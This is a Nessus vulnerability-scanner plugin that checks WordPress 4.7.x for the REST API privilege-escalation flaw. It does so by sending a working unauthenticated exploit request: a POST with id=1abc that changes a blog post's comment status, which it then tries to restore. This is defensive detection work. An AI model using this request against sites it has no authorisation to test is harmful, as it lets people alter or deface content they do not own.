#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(97210);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/02/21 14:37:43 $");

  script_cve_id("CVE-2017-1001000");
  script_osvdb_id(151352);
  script_xref(name:"EDB-ID", value:"41223");
  script_xref(name:"EDB-ID", value:"41224");
  script_xref(name:"EDB-ID", value:"41308");

  script_name(english:"WordPress 4.7.x < 4.7.2 REST API 'id' Parameter Privilege Escalation");
  script_summary(english:"Attempts to disable comments on a blog post.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a
privilege escalation vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress application running on the remote web server is version
4.7.x prior to 4.7.2. It is, therefore, affected by a privilege
escalation vulnerability in the REST API due to a failure to properly
sanitize user-supplied input to the 'id' parameter when editing or
deleting blog posts. An unauthenticated, remote attacker can exploit
this issue to run arbitrary PHP code, inject content into blog posts,
modify blog post attributes, or delete blog posts.

The WordPress REST API is enabled by default as of version 4.7.0. This
vulnerability was silently patched in WordPress version 4.7.2.

Note that WordPress is reportedly affected by additional
vulnerabilities; however, Nessus has not tested for these.");
  # https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?49ca66d9");
  # https://blog.sucuri.net/2017/02/wordpress-rest-api-vulnerability-abused-in-defacement-campaigns.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?172a71ca");
  script_set_attribute(attribute:"see_also", value:"http://thehackernews.com/2017/02/wordpress-hack-seo.html");
  # https://github.com/WordPress/WordPress/commit/89d7d9e70f7d33f4064ca884fa9f30f48b69655e
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f1dc5ff8");
  script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress version 4.7.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/01/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");
include("json.inc");

vuln = FALSE;
fixed = FALSE;
app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port,
  exit_if_unknown_ver : TRUE
);

dir = install['path'];
ver = install['version'];
install_url = build_url(port:port, qs:dir);
url_path = install['Redirect'];
if (!isnull(url_path)) url = url_path;
else url = dir + "/";

# Check if version is 4.7.x < 4.7.2
if (ver =~ '^4\\.7' && ver_compare(ver:ver, fix:'4.7.2', strict:FALSE) < 0) {

  # Get id, comment_status, and link for first blog post
  # All installs should have at least 1 blog post with an
  # 'id' of '1' since by default WordPress has a 'Hello
  # World' blog post on install
  url1 = "/wp-json/wp/v2/posts/1";
  res1 = http_send_recv3(
    method : "GET",
    item   : url1,
    add_headers : make_array("Content-Type", "application/json"),
    port   : port,
    exit_on_fail : TRUE
  );

  if (
     "200 OK" >< res1[0] &&
     "modified_gmt" >< res1[2]
  ) {
    json_data = json_read(res1[2]);
    orig_comment_status = json_data[0]['comment_status'];
    link = json_data[0]['link'];
  }
  else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url, ver);


  # Attempt exploit on blog post by changing comment_status
  # and verify if vuln
  url2 = "/wp-json/wp/v2/posts/1?id=1abc";
  if ( "open" >< orig_comment_status ) {
     postdata = '{"comment_status":"closed"}';
  }
  else postdata = '{"comment_status":"open"}';

  res2 = http_send_recv3(
    method    : "POST",
    item      : url2,
    data      : postdata,
    add_headers : make_array("Content-Type", "application/json"),
    port         : port,
    exit_on_fail : TRUE
  );

  attack_req = http_last_sent_request();

  if (
     "200 OK" >< res2[0] &&
     "modified_gmt" >< res2[2] &&
     !empty_or_null(orig_comment_status)
  ) {
    output = strstr(res2[2], "comment_status");
    if (empty_or_null(output)) output = res2[2];
    json_data = json_read(res2[2]);
    changed_comment_status = json_data[0]['comment_status'];
    if (!empty_or_null(changed_comment_status)) {
      if (changed_comment_status >!< orig_comment_status) {
        vuln = TRUE;
      } else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url, ver);
    } else exit(0, 'The comment_status value could not be parsed from the JSON response.');
  } else audit(AUDIT_RESP_BAD, port, 'REST API requests');


  # If exploit successful, exploit again to change back
  # to original comment_status
  url3 = "/wp-json/wp/v2/posts/1?id=1abc";
  if ( "open" >< changed_comment_status ) {
     postdata = '{"comment_status":"closed"}';
  }
  else postdata = '{"comment_status":"open"}';

  res3 = http_send_recv3(
    method    : "POST",
    item      : url3,
    data      : postdata,
    add_headers : make_array("Content-Type", "application/json"),
    port         : port,
    exit_on_fail : TRUE
  );

  if (
     "200 OK" >< res3[0] &&
     "modified_gmt" >< res3[2]
  ) {
    json_data = json_read(res3[2]);
    verify_comment_status = json_data[0]['comment_status'];
    if (!empty_or_null(verify_comment_status)) {
      if (verify_comment_status >< orig_comment_status) {
        reset = 'Nessus was able to set the comment_status to "' + changed_comment_status + '"\n';
        reset += 'and then reset the comment_status back to "' + orig_comment_status + '" for the\n';
        reset += 'following blog post:\n';
        reset += '\n';
        reset += link + '\n';
        reset += '\n';
      } else {
        reset = 'Nessus was able to set the comment_status to "' + changed_comment_status + '"\n';
        reset += 'but was not able to reset the comment_status back to "' + orig_comment_status + '" for the\n';
        reset += 'following blog post:\n';
        reset += '\n';
        reset += link + '\n';
        reset += '\n';
        reset += 'This post should be manually reviewed by a WordPress administrator to see\n';
        reset += 'if commenting is still allowed on the post.\n';
      }
    } else exit(0, 'The comment_status value could not be parsed from the JSON response.');
  } else audit(AUDIT_RESP_BAD, port, 'REST API requests');

# Audit out if version is not 4.7.x < 4.7.2
} else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url, ver);


# Report if vuln or audit out
if (vuln)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    request    : make_list(attack_req),
    rep_extra  : reset
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url, ver);
